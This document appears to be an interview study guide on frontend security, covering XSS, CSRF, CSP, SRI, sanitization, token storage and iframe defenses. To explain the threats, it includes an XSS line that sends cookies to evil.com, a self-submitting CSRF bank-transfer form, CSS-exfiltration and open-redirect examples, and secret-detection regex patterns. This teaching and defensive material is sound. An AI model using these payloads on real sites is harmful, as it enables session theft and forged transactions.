# Frontend Security

## Overview

Frontend security is a critical interview topic because the browser is an inherently hostile environment -- user-supplied input, third-party scripts, and network attackers all converge in the same runtime. Interviewers assess whether you can identify common attack vectors (XSS, CSRF, clickjacking), implement proper defenses (CSP, sanitization, secure token storage), and reason about the trust boundaries in a web application. Security questions also reveal how deeply you understand browser mechanics like the same-origin policy, cookie attributes, and iframe sandboxing.

---

## Core Concepts

### Cross-Site Scripting (XSS)

XSS occurs when an attacker injects malicious scripts that execute in another user's browser context, gaining access to cookies, session tokens, DOM manipulation, and more.

**Stored XSS** (Persistent)

- Malicious script is saved to the server (e.g., in a database).
- Every user who views the affected page executes the script.
- Example: an attacker posts a comment containing `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`. Every visitor to that page sends their cookies to the attacker.

**Reflected XSS**

- Malicious script is embedded in a URL or form submission.
- The server reflects the input back in the response without sanitization.
- Example: `https://example.com/search?q=<script>alert(1)</script>` where the search page renders the query parameter directly.

**DOM-based XSS**

- The vulnerability exists entirely in client-side JavaScript.
- No server round-trip needed -- the script reads from a source (URL, `postMessage`, localStorage) and writes to a sink (`innerHTML`, `eval`, `document.write`).

```javascript
// VULNERABLE: DOM-based XSS
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
// Attacker: ?name=<img src=x onerror=alert(1)>

// SAFE: Use textContent instead
document.getElementById('greeting').textContent = `Hello, ${name}!`;
```

**XSS Prevention Checklist**:

- Never use `innerHTML` with untrusted data; use `textContent` or framework templating.
- In React, avoid `dangerouslySetInnerHTML` unless you sanitize first.
- Encode output according to context (HTML, attribute, JavaScript, URL, CSS).
- Implement Content Security Policy (CSP).
- Use httpOnly cookies so scripts cannot access tokens.
- Sanitize rich text input with DOMPurify.

### Cross-Site Request Forgery (CSRF)

CSRF tricks an authenticated user's browser into making unintended requests. Because browsers automatically attach cookies to same-domain requests, a malicious page can submit forms or trigger fetches that carry the victim's session cookie.

```html
<!-- Malicious page at evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**CSRF Prevention**:

- `SameSite=Strict` or `SameSite=Lax` cookies (Lax is the default in modern browsers).
- Anti-CSRF tokens: server generates a unique token per session, client sends it in a hidden form field or custom header. The server validates it.
- Check `Origin` or `Referer` headers on the server.
- Require custom headers (e.g., `X-Requested-With`) -- these trigger CORS preflight for cross-origin requests.

### Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which sources of content are trusted. It is the single most effective defense against XSS.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
```

Key directives:

| Directive     | Controls                        |
| ------------- | ------------------------------- |
| `default-src` | Fallback for all resource types |
| `script-src`  | JavaScript sources              |
| `style-src`   | CSS sources                     |
| `img-src`     | Image sources                   |
| `connect-src` | fetch, XHR, WebSocket endpoints |
| `frame-src`   | iframe sources                  |
| `object-src`  | plugins (Flash, Java)           |
| `base-uri`    | `<base>` element                |
| `form-action` | Form submission targets         |

Special values:

- `'self'` -- same origin only.
- `'none'` -- block everything.
- `'unsafe-inline'` -- allow inline scripts/styles (weakens CSP significantly).
- `'unsafe-eval'` -- allow `eval()` (avoid if possible).
- `'nonce-abc123'` -- allow specific inline scripts with matching nonce attribute.
- `'strict-dynamic'` -- trust scripts loaded by already-trusted scripts.

**CSP with nonces (recommended)**:

Server generates a random nonce per request:

```html
<script nonce="r4nd0m123">
  // This inline script is allowed because nonce matches
</script>
```

```
Content-Security-Policy: script-src 'nonce-r4nd0m123' 'strict-dynamic';
```

### HTTPS and Transport Security

HTTPS encrypts all data in transit, preventing eavesdropping and tampering.

**HSTS (HTTP Strict Transport Security)**:

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

- Tells the browser to always use HTTPS for this domain.
- `preload` enables inclusion in browser preload lists (hardcoded HTTPS-only domains).
- Without HSTS, the first HTTP request is vulnerable to downgrade attacks.

### Subresource Integrity (SRI)

SRI ensures that fetched resources (scripts, styles from CDNs) have not been tampered with. The browser computes a hash of the downloaded file and compares it to the expected hash.

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAMN16a3sE7p8VZ/Bb2gIyP4Y1eSk"
  crossorigin="anonymous"
></script>
```

If the file's content changes (e.g., CDN compromise), the browser refuses to execute it.

### Sanitization with DOMPurify

When you must render user-generated HTML (rich text editors, markdown), use DOMPurify to strip dangerous elements and attributes.

```javascript
import DOMPurify from 'dompurify';

const dirtyHTML =
  '<p>Hello</p><script>alert("xss")</script><img src=x onerror=alert(1)>';
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
// Result: '<p>Hello</p><img src="x">'
// Script tag and onerror attribute are removed

// In React
function SafeHTML({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### Auth Token Storage

| Storage              | XSS Safe                    | CSRF Safe           | Auto-sent | Capacity  |
| -------------------- | --------------------------- | ------------------- | --------- | --------- |
| httpOnly Cookie      | Yes                         | No (needs SameSite) | Yes       | ~4KB      |
| localStorage         | No                          | Yes                 | No        | ~5-10MB   |
| sessionStorage       | No                          | Yes                 | No        | ~5-10MB   |
| Memory (JS variable) | Partially (lost on refresh) | Yes                 | No        | Unlimited |

**Best practice**: Use httpOnly, Secure, SameSite=Strict cookies for session tokens. The token never touches JavaScript, so XSS cannot steal it. Pair with CSRF protection (SameSite + anti-CSRF token for older browsers).

**If you must use localStorage** (e.g., SPA with third-party auth):

- Use short-lived access tokens (15 minutes).
- Store refresh tokens in httpOnly cookies only.
- Implement aggressive CSP to minimize XSS risk.

### Iframe Security

**X-Frame-Options header**:

```
X-Frame-Options: DENY          # Cannot be embedded in any iframe
X-Frame-Options: SAMEORIGIN    # Only same-origin can embed
```

**CSP frame-ancestors** (modern replacement):

```
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

**Sandbox attribute** (for embedding untrusted content):

```html
<iframe
  src="https://untrusted.com"
  sandbox="allow-scripts allow-same-origin"
  referrerpolicy="no-referrer"
>
</iframe>
```

Sandbox restrictions (all applied by default, selectively relaxed):

- `allow-scripts` -- permit JavaScript execution.
- `allow-same-origin` -- allow the frame to use its real origin.
- `allow-forms` -- permit form submission.
- `allow-popups` -- permit `window.open`.
- `allow-top-navigation` -- permit navigation of the parent page.

Warning: `allow-scripts` + `allow-same-origin` together is dangerous because the iframe can remove the sandbox attribute.

### Clickjacking

An attacker overlays a transparent iframe of your site on top of a decoy page. The user thinks they are clicking a button on the attacker's page, but they are actually clicking on your site.

**Prevention**: X-Frame-Options or CSP `frame-ancestors`, plus visual frame-busting as a fallback:

```javascript
// Frame-busting (fallback, not primary defense)
if (window.self !== window.top) {
  window.top.location = window.self.location;
}
```

### Open Redirects

An open redirect occurs when your application redirects users based on untrusted input without validation.

```
https://example.com/login?redirect=https://evil.com
```

After login, the user is redirected to `evil.com`, which may be a phishing page that looks identical to your site.

**Prevention**:

```javascript
function safeRedirect(url) {
  const parsed = new URL(url, window.location.origin);
  const allowedHosts = ['example.com', 'app.example.com'];

  if (!allowedHosts.includes(parsed.hostname)) {
    return '/'; // redirect to home instead
  }

  return parsed.pathname + parsed.search;
}
```

### Dependency Vulnerabilities

Third-party packages are a major attack surface. A single compromised dependency in your supply chain can inject malicious code into your application.

**Prevention**:

- Run `npm audit` regularly and fix vulnerabilities.
- Use `npm audit --omit=dev` for production-relevant issues.
- Lock dependency versions with `package-lock.json`.
- Use tools like Snyk, Socket.dev, or Dependabot for continuous monitoring.
- Review new dependencies before adding them (check maintainers, download counts, recent activity).
- Consider `npm install --ignore-scripts` to prevent postinstall attacks during development.

### Secrets in Frontend Code

**Everything in frontend code is public**. This includes:

- API keys bundled in JavaScript.
- Environment variables prefixed with `NEXT_PUBLIC_` or `VITE_`.
- Hardcoded tokens, passwords, or connection strings.

```javascript
// WRONG: Secret in frontend code
const apiKey = 'sk-secret-key-12345';
fetch(`https://api.openai.com/v1/chat`, {
  headers: { Authorization: `Bearer ${apiKey}` },
});

// CORRECT: Proxy through your backend
fetch('/api/chat', {
  method: 'POST',
  body: JSON.stringify({ message: userInput }),
});
// Your backend holds the secret and calls OpenAI
```

**Rule**: If the key has a prefix like `sk-` (secret key), it must never appear in frontend code. Use a backend proxy.

---

## Common Interview Questions

### Q1: What is XSS and how do you prevent it?

**Answer**: Cross-Site Scripting is an injection attack where malicious scripts execute in a victim's browser context. There are three types: stored (persisted in the database), reflected (included in the server response from the URL), and DOM-based (client-side JavaScript writes untrusted data to a DOM sink). Prevention is layered: (1) Use framework auto-escaping (React, Vue, Angular all escape by default). (2) Never use `innerHTML` or `dangerouslySetInnerHTML` with unsanitized input. (3) Deploy CSP with strict nonces to block inline scripts. (4) Store auth tokens in httpOnly cookies. (5) Sanitize any user-generated HTML with DOMPurify. (6) Validate and encode output based on context (HTML body, attribute, JavaScript, URL).

### Q2: How does Content Security Policy protect against XSS?

**Answer**: CSP restricts which resources the browser can load and execute. By setting `script-src 'nonce-random123'`, only inline scripts with the matching nonce attribute and scripts from explicitly listed origins will execute. Even if an attacker injects `<script>alert(1)</script>` into the page, the browser blocks it because it lacks the nonce. CSP also blocks `eval()` by default, prevents loading scripts from attacker-controlled domains, and can report violations to a monitoring endpoint via `report-uri` or `report-to` directives. A strict CSP with nonces and `strict-dynamic` is the recommended approach for modern applications.

### Q3: Explain CSRF and its countermeasures.

**Answer**: CSRF exploits the browser's automatic cookie attachment to forge authenticated requests from a malicious site. For example, if a user is logged into their bank and visits an attacker's page, that page can submit a form to the bank's transfer endpoint, and the browser includes the session cookie. Countermeasures: (1) SameSite cookie attribute -- `Lax` prevents cookies on cross-site POST, `Strict` prevents them on all cross-site requests. (2) Anti-CSRF tokens -- server generates a unique token per session, embeds it in forms, and validates on submission. Attackers cannot read the token cross-origin. (3) Check the Origin header on the server. (4) Require custom headers like `X-Requested-With` which trigger CORS preflight and cannot be sent cross-origin without server permission.

### Q4: Where should you store authentication tokens in a frontend application?

**Answer**: The most secure option is httpOnly, Secure, SameSite=Strict cookies. The token is never accessible to JavaScript, so XSS attacks cannot steal it. CSRF is mitigated by SameSite and optional anti-CSRF tokens. If you must use localStorage (common in SPAs with third-party auth providers), use short-lived access tokens (15 minutes) and store refresh tokens in httpOnly cookies. Never store long-lived tokens in localStorage. sessionStorage is slightly better (cleared on tab close) but still vulnerable to XSS within the same tab. Storing tokens in JavaScript memory is secure against XSS persistence but loses the token on page refresh, requiring re-authentication or a silent refresh flow.

### Q5: What is Subresource Integrity and when should you use it?

**Answer**: SRI is a security feature that lets the browser verify that files fetched from CDNs or third-party origins have not been tampered with. You add an `integrity` attribute containing a cryptographic hash of the expected file content. If the downloaded file's hash does not match, the browser refuses to execute it. Use SRI whenever loading scripts or stylesheets from external CDNs. This protects against CDN compromises, man-in-the-middle attacks, and supply chain attacks where an attacker modifies a popular library hosted on a CDN. Generate hashes with `shasum -b -a 384 file.js | awk '{ print $1 }' | xxd -r -p | base64`.

### Q6: How would you secure an iframe embedding third-party content?

**Answer**: Apply multiple layers: (1) Use the `sandbox` attribute with the minimum necessary permissions -- start with just `sandbox` (blocks everything) and add back only what is needed (e.g., `allow-scripts`). (2) Never combine `allow-scripts` and `allow-same-origin` unless absolutely necessary, as this lets the iframe remove its own sandbox. (3) Set `referrerpolicy="no-referrer"` to prevent leaking URL information. (4) Use CSP `frame-src` to whitelist which origins can be embedded. (5) For your own pages, set `X-Frame-Options: DENY` or `frame-ancestors 'none'` to prevent them from being embedded by others. (6) Listen carefully to `postMessage` events -- always validate `event.origin` before processing messages.

### Q7: What are open redirects and why are they dangerous?

**Answer**: An open redirect occurs when an application uses user-controllable input to determine a redirect destination without validation. Attackers use this for phishing: `https://trusted-site.com/login?redirect=https://evil-site.com`. The victim sees the trusted domain in the URL and trusts the page. After logging in, they are redirected to a phishing site that harvests additional credentials. Prevention: validate the redirect URL against an allowlist of domains, use relative paths only, or strip the protocol and host from the redirect parameter. OAuth flows are particularly vulnerable because the redirect URI determines where the authorization code is sent.

### Q8: How do you handle security in a CI/CD pipeline for a frontend project?

**Answer**: (1) Run `npm audit` in CI and fail the build on critical vulnerabilities. (2) Use a tool like Snyk or Socket.dev to scan dependencies on every PR. (3) Lint for security anti-patterns with ESLint plugins like `eslint-plugin-security` and `eslint-plugin-no-unsanitized`. (4) Run SAST (Static Application Security Testing) tools. (5) Never commit secrets -- use `.env` files locally and secret management in CI (GitHub Secrets, Vault). (6) Add pre-commit hooks that scan for accidental secret commits (e.g., git-secrets, truffleHog). (7) Pin CDN resources with SRI hashes. (8) Generate and validate CSP headers as part of the build. (9) Run automated DAST (Dynamic Application Security Testing) against staging environments.

---

## Code Examples

### CSP Nonce Implementation (Next.js Middleware)

```javascript
// middleware.ts
import { NextResponse } from 'next/server';
import crypto from 'crypto';

export function middleware(request) {
  const nonce = crypto.randomBytes(16).toString('base64');
  const response = NextResponse.next();

  const cspHeader = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `connect-src 'self' https://api.example.com`,
    `font-src 'self'`,
    `frame-src 'none'`,
    `object-src 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
  ].join('; ');

  response.headers.set('Content-Security-Policy', cspHeader);
  response.headers.set('X-Nonce', nonce);

  return response;
}
```

### XSS-Safe Rich Text Renderer

```javascript
import DOMPurify from 'dompurify';

const SAFE_CONFIG = {
  ALLOWED_TAGS: [
    'p',
    'br',
    'b',
    'i',
    'em',
    'strong',
    'a',
    'ul',
    'ol',
    'li',
    'h1',
    'h2',
    'h3',
    'blockquote',
    'code',
    'pre',
    'img',
  ],
  ALLOWED_ATTR: ['href', 'target', 'rel', 'src', 'alt', 'class'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],
};

// Hook to enforce rel="noopener noreferrer" on all links
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

function sanitizeHTML(dirtyHTML) {
  return DOMPurify.sanitize(dirtyHTML, SAFE_CONFIG);
}

// React component
function RichTextContent({ html }) {
  const cleanHTML = sanitizeHTML(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

### Secure PostMessage Communication

```javascript
// Parent window: send message to iframe
function sendToIframe(iframe, message) {
  const targetOrigin = 'https://trusted-iframe.com';
  iframe.contentWindow.postMessage(message, targetOrigin);
}

// Parent window: receive message from iframe
function setupMessageListener() {
  const allowedOrigins = new Set([
    'https://trusted-iframe.com',
    'https://another-trusted.com',
  ]);

  window.addEventListener('message', (event) => {
    if (!allowedOrigins.has(event.origin)) {
      return; // silently ignore untrusted origins
    }

    // Validate message structure
    if (typeof event.data !== 'object' || !event.data.type) {
      return;
    }

    switch (event.data.type) {
      case 'resize':
        handleResize(event.data.height);
        break;
      case 'navigate':
        handleNavigation(event.data.url);
        break;
      default:
        break;
    }
  });
}
```

### Anti-CSRF Token Implementation

```javascript
// Server-side: generate and validate CSRF token
function generateCSRFToken(session) {
  const token = crypto.randomBytes(32).toString('hex');
  session.csrfToken = token;
  return token;
}

function validateCSRFToken(request, session) {
  const token = request.headers['x-csrf-token'] || request.body._csrf;
  if (!token || token !== session.csrfToken) {
    throw new Error('CSRF token validation failed');
  }
}

// Client-side: include token in requests
async function secureFetch(url, options = {}) {
  const csrfToken = document
    .querySelector('meta[name="csrf-token"]')
    ?.getAttribute('content');

  return fetch(url, {
    ...options,
    credentials: 'include',
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
    },
  });
}
```

### Secret Scanner Pre-Commit Hook

```bash
#!/bin/bash
# .git/hooks/pre-commit

PATTERNS=(
  'sk-[a-zA-Z0-9]{20,}'     # OpenAI-style secret keys
  'AKIA[0-9A-Z]{16}'         # AWS access key IDs
  'ghp_[a-zA-Z0-9]{36}'      # GitHub personal access tokens
  'password\s*=\s*["\x27].+' # Hardcoded passwords
  'secret\s*=\s*["\x27].+'   # Hardcoded secrets
)

STAGED_FILES=$(git diff --cached --name-only --diff-filter=ACM)

for FILE in $STAGED_FILES; do
  for PATTERN in "${PATTERNS[@]}"; do
    if grep -qE "$PATTERN" "$FILE" 2>/dev/null; then
      echo "ERROR: Potential secret found in $FILE matching pattern: $PATTERN"
      exit 1
    fi
  done
done
```

---

## Gotchas & Edge Cases

1. **React does not escape `href` attributes**. Setting `<a href={userInput}>` where `userInput` is `javascript:alert(1)` executes the script. Always validate URLs start with `https://` or `/`.

2. **`dangerouslySetInnerHTML` bypasses React's auto-escaping entirely**. If you must use it, always sanitize with DOMPurify first. Never assume server-side data is safe.

3. **SameSite=Lax still sends cookies on top-level GET navigations**. This means link-based CSRF on GET endpoints is still possible. Ensure GET requests are truly idempotent and do not modify state.

4. **CSP `unsafe-inline` for styles is common but weakens security**. CSS injection can exfiltrate data using `background: url(https://evil.com/steal?data=...)` selectors. Use nonces for styles too when possible.

5. **localStorage is shared across all tabs for the same origin**. If one tab is XSS-compromised, the attacker can read tokens from localStorage that were set by another tab.

6. **`window.opener` reference**. Links with `target="_blank"` give the opened page access to `window.opener`, enabling the new page to navigate the original page to a phishing site. Always use `rel="noopener noreferrer"`.

7. **SVG files can contain JavaScript**. If your application allows SVG uploads and serves them inline or as `<img>` with same-origin, they can execute scripts. Serve user-uploaded SVGs from a separate domain or sanitize them.

8. **`eval()`, `new Function()`, and `setTimeout/setInterval` with strings** all execute arbitrary code. CSP can block them, but it is better to avoid them entirely.

9. **CORS misconfiguration: reflecting the Origin header**. Some servers dynamically set `Access-Control-Allow-Origin` to whatever the request's `Origin` is. This is equivalent to `*` but worse because it works with `credentials: 'include'`. Always use an allowlist.

10. **Mixed content**. Loading HTTP resources on an HTTPS page is blocked (active mixed content like scripts) or warned (passive mixed content like images). Ensure all resources use HTTPS.

---

## Quick Reference

| Threat            | Attack Vector                  | Primary Defense                   | Secondary Defense                   |
| ----------------- | ------------------------------ | --------------------------------- | ----------------------------------- |
| Stored XSS        | Malicious input saved to DB    | Output encoding, CSP              | Input validation, DOMPurify         |
| Reflected XSS     | Malicious input in URL         | Output encoding, CSP              | Input validation                    |
| DOM XSS           | Client-side sink (innerHTML)   | textContent, framework escaping   | CSP nonces                          |
| CSRF              | Forged cross-origin requests   | SameSite cookies                  | Anti-CSRF tokens                    |
| Clickjacking      | Transparent iframe overlay     | X-Frame-Options / frame-ancestors | Frame-busting JS                    |
| Open Redirect     | Untrusted redirect URL         | URL allowlist validation          | Relative paths only                 |
| CDN Tampering     | Compromised third-party script | Subresource Integrity (SRI)       | Self-hosting                        |
| Token Theft       | XSS reads localStorage         | httpOnly cookies                  | Short-lived tokens                  |
| Secret Exposure   | API keys in frontend bundle    | Backend proxy                     | Environment variables (server-side) |
| Dependency Attack | Malicious npm package          | npm audit, lockfiles              | Snyk, Socket.dev                    |
| Man-in-the-Middle | HTTP downgrade                 | HTTPS + HSTS                      | HSTS preload                        |
| Iframe Injection  | Embedding malicious frames     | CSP frame-src                     | sandbox attribute                   |
